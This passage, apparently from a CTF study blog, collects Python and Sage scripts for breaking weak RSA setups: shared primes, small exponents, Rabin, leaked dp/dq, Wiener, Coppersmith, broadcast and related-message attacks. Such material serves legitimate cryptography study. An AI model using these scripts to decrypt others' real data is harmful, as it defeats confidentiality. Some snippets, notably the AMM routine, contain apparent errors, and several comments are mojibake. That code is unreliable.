<p>$$<br>q_2 &#x3D; n_2 &#x2F;&#x2F; p<br>$$</p>
<p>$ p$ can be calculated with function <code>gcd()</code> , and  use division to solve out the $q_1$ and $q_2$.</p>
<p>The problem converts to the <code>Original_RSA</code>.</p>
<p><strong>Solution</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_NPM</span>(<span class="params">n1,n2,e,c1</span>):</span><br><span class="line">    p = gmpy2.gcd(n1,n2)</span><br><span class="line">    q1 = n1//p  <span class="comment"># keypoint</span></span><br><span class="line">    N = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e,<span class="built_in">int</span>(N))</span><br><span class="line">    m = gmpy2.powmod(c1,d,n1)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p><em>Remember that $n_1$ and $c_1$ are one-to-one!</em></p>
<h1 id="LOW-EXPONENT"><a href="#LOW-EXPONENT" class="headerlink" title="LOW EXPONENT"></a>LOW EXPONENT</h1><h2 id="e-x3D-3"><a href="#e-x3D-3" class="headerlink" title="e &#x3D; 3"></a>e &#x3D; 3</h2><blockquote>
<p>or one-to-one function</p>
</blockquote>
<p>JUST Bruck. </p>
<ol>
<li>$m^e &lt; n$, means that $k &#x3D; 0$ in code below</li>
<li>$m^e &gt; n$</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Low_Exponent_e3</span>(<span class="params">c,e,n</span>):</span><br><span class="line">    k = <span class="number">0</span> <span class="comment"># one</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>: <span class="comment"># the other</span></span><br><span class="line">        cm = c + n*k</span><br><span class="line">        m, index = gmpy2.iroot(cm, e)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> m</span><br><span class="line">        k += <span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="e-and-varphi-n-are-not-relatively-prime"><a href="#e-and-varphi-n-are-not-relatively-prime" class="headerlink" title="$e$ and $\varphi(n)$ are not relatively-prime"></a>$e$ and $\varphi(n)$ are not relatively-prime</h2><h3 id="e-x3D-2"><a href="#e-x3D-2" class="headerlink" title="e &#x3D; 2"></a>e &#x3D; 2</h3><blockquote>
<p>Rabin</p>
</blockquote>
<p><strong>PART1</strong> $m_p$ and $m_q$</p>
<p>Split into two scenarios for discussion: </p>
<ol>
<li>$p$ and $q$ are satisfied $p \equiv q \equiv 3 \mod 4$.</li>
</ol>
<p>$$<br>m_p \equiv c^{\frac{1}{4}(p + 1)} \mod p<br>$$</p>
<p>$$<br>m_q \equiv c^{\frac{1}{4}(q + 1)} \mod q<br>$$</p>
<ol start="2">
<li>$p$ and $q$ are different to 1.</li>
</ol>
<p>$$<br>m_p \equiv c^{\frac{1}{2}} \mod p<br>$$</p>
<p>$$<br>m_q \equiv c^{\frac{1}{2}} \mod q<br>$$</p>
<p><strong>PART2</strong> Calculated $y_p$ and $y_q$ with Extended Euclidean Algorithm whose function is <code>gmpy2.gcdext()</code>.<br>$$<br>y_p \cdot p + y_q \cdot q &#x3D; 1<br>$$<br><strong>PART3</strong> Solve out four plaintexts.<br>$$<br>a \equiv (y_p \cdot p \cdot m_q + y_q \cdot q \cdot m_p) \mod n<br>$$</p>
<p>$$<br>b \equiv n - a<br>$$</p>
<p>$$<br>c \equiv (y_p \cdot p \cdot m_q - y_q \cdot q \cdot m_p) \mod n<br>$$</p>
<p>$$<br>d \equiv n - c<br>$$</p>
<p>Thus, we will get four different plaintext, and one of them is the true plaintext. </p>
<p>Here is the complete code: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Rabin_e2</span>(<span class="params">c,n,p,q</span>):</span><br><span class="line">    mp = gmpy2.powmod(c,(p+<span class="number">1</span>)//<span class="number">4</span>,p)</span><br><span class="line">    mq = gmpy2.powmod(c,(q+<span class="number">1</span>)//<span class="number">4</span>,q)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mp = gmpy2.powmod(c,1/2,p)</span></span><br><span class="line"><span class="string">    mq = gmpy2.powmod(c,1/2,q)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    gcd,yp,yq = gmpy2.gcdext(p,q)</span><br><span class="line"></span><br><span class="line">    m1 = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    m2 = n - m1</span><br><span class="line">    m3 = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    m4 = n - m3</span><br><span class="line">    <span class="keyword">return</span> m1, m2, m3, m4</span><br></pre></td></tr></table></figure>



<h3 id="e-x3D-2-1"><a href="#e-x3D-2-1" class="headerlink" title="e !&#x3D; 2"></a>e !&#x3D; 2</h3><p>If $e$ is not equal to 2, we use another way to calculate the final $m$. </p>
<p>For example, $gcd(e, \varphi(n)) &#x3D; a$. We can divide $e$ to get the equation $gcd(e&#x2F;&#x2F;a, \varphi(n)) &#x3D; 1$ to solve the private key $d$.</p>
<p>Finally, we get the $m^{a}$. We use <code>iroot($m^&#123;a&#125;$, a)[0]</code> to get the final plaintext $m$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># We define phi as N</span></span><br><span class="line">a = gcd(e, N)</span><br><span class="line">d = invert(e//a, N)</span><br><span class="line">m = iroot(powmod(c, d, n), a)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>



<h3 id="AMM"><a href="#AMM" class="headerlink" title="AMM"></a>AMM</h3><blockquote>
<p>The same $e$ is too large to solve out.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GF</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p = a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a,b,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">x,e,p</span>):</span><br><span class="line">    GF(p)</span><br><span class="line">    y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> g(y, (p-<span class="number">1</span>)//e) == <span class="number">1</span>:</span><br><span class="line">        y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</span><br><span class="line">    <span class="comment">#p-1 = e^t*s</span></span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p % e == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">    s = p // (e**t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e&#x27;</span>, e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;s&#x27;</span>, s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;t&#x27;</span>, t)</span><br><span class="line">    <span class="comment"># s|ralpha-1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alpha = (s * k + <span class="number">1</span>) // e</span><br><span class="line">    a = g(y, (e ** (t - <span class="number">1</span>) ) * s)</span><br><span class="line">    b = g(x, e * alpha - <span class="number">1</span>)</span><br><span class="line">    c = g(y, s)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = g(b,e**(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d,a)</span><br><span class="line">        b = b * (g(g(c, e), j))</span><br><span class="line">        h = h * g(c, j)</span><br><span class="line">        c = g(c, e)</span><br><span class="line">    root = (g(x, alpha * h)) % p</span><br><span class="line">    roots = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">        mp2 = root * g(a,i) % p</span><br><span class="line">        roots.add(mp2)</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> m: <span class="comment"># edit</span></span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>



<h1 id="RSA-LEAKAGE"><a href="#RSA-LEAKAGE" class="headerlink" title="RSA_LEAKAGE"></a>RSA_LEAKAGE</h1><h2 id="Leakage-d"><a href="#Leakage-d" class="headerlink" title="Leakage_d"></a>Leakage_d</h2><p><strong>Use RSAConverter</strong>.</p>
<ul>
<li>$n$, $d$, hex(), delete <code>0x</code></li>
<li>$e$, hex(), delete <code>x</code></li>
</ul>
<h2 id="Leakage-dp-amp-dq"><a href="#Leakage-dp-amp-dq" class="headerlink" title="Leakage_dp&amp;dq"></a>Leakage_dp&amp;dq</h2><p><strong>Dedection and keypoint</strong>!</p>
<p>Prepare and make a definition to $d_p$ and $d_q$.<br>$$<br>d_p \equiv d \mod p-1<br>$$</p>
<p>$$<br>d_q \equiv d \mod q-1<br>$$</p>
<p>After deductions, we can get four significant equations or relations.<br>$$<br>q \times InvQ \equiv 1 \mod p<br>$$</p>
<p>$$<br>m_p \equiv c^{d_p} \mod p<br>$$</p>
<p>$$<br>m_q \equiv c^{d_q} \mod q<br>$$</p>
<p>$$<br>m \equiv  (((m_p - m_q)\times InvQ)\mod p)\times q + m_q<br>$$</p>
<p>And make the equations convert to codes. Here is the main function: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Leakage_dp_dq</span>(<span class="params">dp, dq, p, q, c</span>):</span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = gmpy2.powmod(c, dp, p)</span><br><span class="line">    mq = gmpy2.powmod(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ)%p)*q + mq</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>



<h2 id="Leakage-dp"><a href="#Leakage-dp" class="headerlink" title="Leakage_dp"></a>Leakage_dp</h2><h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p><strong>Known</strong>:<br>$$<br>d_p \equiv d \mod (p-1)<br>$$</p>
<p>$$<br>d\times e \equiv 1\mod N \equiv 1 \mod (p-1)(q-1) \tag{1}<br>$$</p>
<p>Make full use of the two known equations and deduce the key condition to obtain the final $p$ and $q$.<br>$$<br>d_p \times e \equiv d \times e \mod (p-1) \equiv de + k_1(p-1) \tag{2}<br>$$<br>Substitute  <code>(2)</code> to <code>(1)</code>:<br>$$<br>k_1(p-1) + d_p e &#x3D; 1 + k_2(p-1)(q-1)<br>$$</p>
<p>$$<br>d_pe - 1 &#x3D; (p-1)[k_2(q-1) -k_1]<br>$$</p>
<p>Assume $k_2(q-1) - k_1$ is $x$, and $x$ is range from 0 and $e$, and we can figure out the $p$ from the equation:<br>$$<br>p &#x3D; \frac{d_{p} e-1}{x} + 1<br>$$<br>If we brute the $p$ in range(0, e) and $q &#x3D; n \div p$ is prime or Integer, we will get the true $p$ and $q$. The code is as follows: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Leakage_dp</span>(<span class="params">n,e,dp,c</span>):</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):  <span class="comment"># start with 1</span></span><br><span class="line">        p = (dp*e - <span class="number">1</span>)//i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            q = n//p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = gmpy2.invert(e, N)</span><br><span class="line">        m = gmpy2.powmod(c, d, n)</span><br><span class="line">        <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<h3 id="dp-extension-1-n-x3D-p-b-cdot-q"><a href="#dp-extension-1-n-x3D-p-b-cdot-q" class="headerlink" title="dp_extension-1 $n &#x3D; p^{b} \cdot q$"></a>dp_extension-1 $n &#x3D; p^{b} \cdot q$</h3><blockquote>
<p>reference: Larrozo</p>
<p>relate: [2020YCB]Power</p>
</blockquote>
<img src="/2022/11/04/22-11-04-RSA/hense_lifting.png" class="" title="hense lifting">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br></pre></td></tr></table></figure>



<h3 id="dp-extension-2-coppersmith-known-dp-high"><a href="#dp-extension-2-coppersmith-known-dp-high" class="headerlink" title="dp_extension-2 coppersmith known dp high"></a>dp_extension-2 coppersmith known dp high</h3><p>Given: $n, e, dp_0,c,k$</p>
<p><em>the $dp_0$ is the high-digits$(nbits - k)$ of dp, meaning that $dp_0 &#x3D; dp &gt;&gt; k$</em></p>
<p>Solve: use the coppersmith-high p</p>
<h3 id="dp-extension-3-p-x3D-gcd-m-e-cdot-dp-m-n"><a href="#dp-extension-3-p-x3D-gcd-m-e-cdot-dp-m-n" class="headerlink" title="dp_extension-3 $p &#x3D; gcd(m^{e\cdot dp} - m, n)$"></a>dp_extension-3 $p &#x3D; gcd(m^{e\cdot dp} - m, n)$</h3><img src="/2022/11/04/22-11-04-RSA/gcd.png" class="" title="extension">

<h1 id="LARGE-e"><a href="#LARGE-e" class="headerlink" title="LARGE $e$"></a>LARGE $e$</h1><h2 id="Wiener-Attack"><a href="#Wiener-Attack" class="headerlink" title="Wiener Attack"></a>Wiener Attack</h2><blockquote>
<p>$d &lt; N^{0.25}$</p>
</blockquote>
<h3 id="original-deduction"><a href="#original-deduction" class="headerlink" title="original deduction"></a>original deduction</h3><p>From the RSA proof, we have a DEFAULT RULE:<br>$$<br>e\times d \equiv 1 \mod \varphi(n)<br>$$<br>If satisfied conditions, we will get the deduced equation:<br>$$<br>e \times d &#x3D; k \times \varphi(n) + 1 \approx k \times \varphi(n)<br>$$<br>In cryptography, the $n$ is usually very large. So, we can make a connection with $\varphi(n)$:<br>$$<br>\varphi(n) \approx n<br>$$<br>Thus, we can get the final deduction:<br>$$<br>e\times d \approx k \times n<br>$$</p>
<p>$$<br>\frac{e}{n} \approx \frac{k}{d}<br>$$</p>
<h3 id="continued-fraction"><a href="#continued-fraction" class="headerlink" title="continued fraction"></a>continued fraction</h3><p>Use <strong>Extended Euclidean Algorithm</strong>, and we will get the equation. Here is the proof-picture: </p>
<img src="/2022/11/04/22-11-04-RSA/1.jpg" class="" title="continued_fraction">

<p>For the example, we can get the continued fraction that <code>34/99 -&gt; [0, 2, 1, 10, 3]</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fra</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    continued fraction expansion</span></span><br><span class="line"><span class="string">    :param x: åˆ†å­</span></span><br><span class="line"><span class="string">    :param y: åˆ†æ¯</span></span><br><span class="line"><span class="string">    :return: è¿åˆ†æ•°å±•å¼€åˆ—è¡¨cf[]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="comment"># print(cf)</span></span><br><span class="line">    <span class="keyword">return</span> cf</span><br></pre></td></tr></table></figure>

<h3 id="gradual-fraction"><a href="#gradual-fraction" class="headerlink" title="gradual fraction"></a>gradual fraction</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gradual_fra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param cf: è¿åˆ†æ•°å±•å¼€</span></span><br><span class="line"><span class="string">    :return: æœ€åçš„æ”¶æ•›å­,æ”¶æ•›å­åˆ—è¡¨ gf[]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    c = []</span><br><span class="line">    d = []</span><br><span class="line">    c.append(<span class="number">1</span>) <span class="comment"># c[0] = 1</span></span><br><span class="line">    c.append(cf[<span class="number">0</span>]) <span class="comment"># c[1] = cf[0]</span></span><br><span class="line">    d.append(<span class="number">0</span>) <span class="comment"># d[0] = 0</span></span><br><span class="line">    d.append(<span class="number">1</span>) <span class="comment"># d[1]</span></span><br><span class="line">    gf = []</span><br><span class="line">    gf.append(cf[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(cf)+<span class="number">1</span>):</span><br><span class="line">        c.append(cf[i-<span class="number">1</span>]*c[i-<span class="number">1</span>] + c[i-<span class="number">2</span>])</span><br><span class="line">        d.append(cf[i-<span class="number">1</span>]*d[i-<span class="number">1</span>] + d[i-<span class="number">2</span>])</span><br><span class="line">        gf.append((c[i], d[i]))</span><br><span class="line">    <span class="comment"># print(gf)</span></span><br><span class="line">    <span class="keyword">return</span> c[<span class="built_in">len</span>(cf)], d[<span class="built_in">len</span>(cf)], gf</span><br></pre></td></tr></table></figure>

<h3 id="Vedaâ€™s-theorem"><a href="#Vedaâ€™s-theorem" class="headerlink" title="Vedaâ€™s theorem"></a>Vedaâ€™s theorem</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    éŸ¦è¾¾å®šç†ï¼Œæ±‚è§£æ–¹ç¨‹ï¼šx^2+(p+q)x+pq = 0</span></span><br><span class="line"><span class="string">    :param a: x^2ç³»æ•°</span></span><br><span class="line"><span class="string">    :param b: xç³»æ•°</span></span><br><span class="line"><span class="string">    :param c: pq</span></span><br><span class="line"><span class="string">    :return: p,q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># par = gmpy2.isqrt(b * b - 4 * a * c)</span></span><br><span class="line">    par = gmpy2.iroot(b * b - <span class="number">4</span> * a * c, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br></pre></td></tr></table></figure>

<h3 id="main-Wiener"><a href="#main-Wiener" class="headerlink" title="main Wiener"></a>main Wiener</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Wiener_Attack</span>(<span class="params">e,n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    å…·ä½“å®ç°</span></span><br><span class="line"><span class="string">    :param e:</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continued_fra(e, n)</span><br><span class="line">    gf = gradual_fra(cf)[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> k, d <span class="keyword">in</span> gf[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        N = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - N + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure>



<h2 id="Boneh-Durfee-Attack"><a href="#Boneh-Durfee-Attack" class="headerlink" title="Boneh-Durfee Attack"></a>Boneh-Durfee Attack</h2><blockquote>
<p>$d&lt; N^{0.29}$</p>
</blockquote>
<h1 id="COPPPERSMITH"><a href="#COPPPERSMITH" class="headerlink" title="COPPPERSMITH"></a>COPPPERSMITH</h1><h2 id="high-m"><a href="#high-m" class="headerlink" title="high m"></a>high m</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># high m</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>(<span class="params">high_m, n, c</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">3</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">int</span>(M))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>



<h2 id="high-p"><a href="#high-p" class="headerlink" title="high p"></a>high p</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># high p</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase3</span>(<span class="params">high_p, n ,c</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = high_p + x</span><br><span class="line">    x0 = p.small_roots(X = <span class="number">2</span>^<span class="number">128</span>, beta = <span class="number">0.1</span>)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    P = <span class="built_in">int</span>(p(x0))</span><br><span class="line">    Q = n // P</span><br><span class="line">    <span class="keyword">assert</span> P*Q == n</span><br><span class="line">    d = inverse_mod(e, (P-<span class="number">1</span>)*(Q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(power_mod(c, d, n))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>



<h2 id="low-d"><a href="#low-d" class="headerlink" title="low d"></a>low d</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># low d</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFullP</span>(<span class="params">low_p, n</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = x*<span class="number">2</span>^<span class="number">512</span> + low_p</span><br><span class="line">    root = (p-n).monic().small_roots(X = <span class="number">2</span>^<span class="number">128</span>, beta = <span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        <span class="keyword">return</span> p(root[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase4</span>(<span class="params">low_d, n, c</span>):</span><br><span class="line">    maybe_p = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        p0 = solve_mod([<span class="number">3</span>*p*low_d  == p + k*(n*p - p^<span class="number">2</span> - n + p)], <span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">        maybe_p += [<span class="built_in">int</span>(x[<span class="number">0</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> p0]</span><br><span class="line">    <span class="comment"># print(maybe_p)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> maybe_p:</span><br><span class="line">        P = getFullP(x, n)</span><br><span class="line">        <span class="keyword">if</span> P: <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    P = <span class="built_in">int</span>(P)</span><br><span class="line">    Q = n // P</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> P*Q == n</span><br><span class="line">    </span><br><span class="line">    d = inverse_mod(<span class="number">3</span>, (P-<span class="number">1</span>)*(Q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(power_mod(c, d, n))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>



<h2 id="crt-x2F-broadcast"><a href="#crt-x2F-broadcast" class="headerlink" title="crt&#x2F;broadcast"></a>crt&#x2F;broadcast</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># crt/broadcast</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase5</span>(<span class="params">n1, c1, n2, c2, n3, c3</span>):</span><br><span class="line">    r = CRT([c1, c2, c3], [n1, n2, n3])</span><br><span class="line">    m = <span class="built_in">int</span>(r)^(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>



<h2 id="Franklinâ€“Reiter-related-message-attack"><a href="#Franklinâ€“Reiter-related-message-attack" class="headerlink" title="Franklinâ€“Reiter related-message attack"></a>Franklinâ€“Reiter related-message attack</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n  =</span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">g1 = x^e - c1</span><br><span class="line">g2 = (x+<span class="number">1</span>)^e - c2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyGcd</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x.monic()</span><br><span class="line">    <span class="keyword">return</span> MyGcd(y, x%y)</span><br><span class="line"></span><br><span class="line">v = MyGcd(g2, g1)</span><br><span class="line">M = n - v.coefficients()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> g1(M) == <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(M)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>



<h2 id="Boneh-Burfee-Attack"><a href="#Boneh-Burfee-Attack" class="headerlink" title="Boneh Burfee Attack"></a>Boneh Burfee Attack</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Boneh Burfee Attack</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable 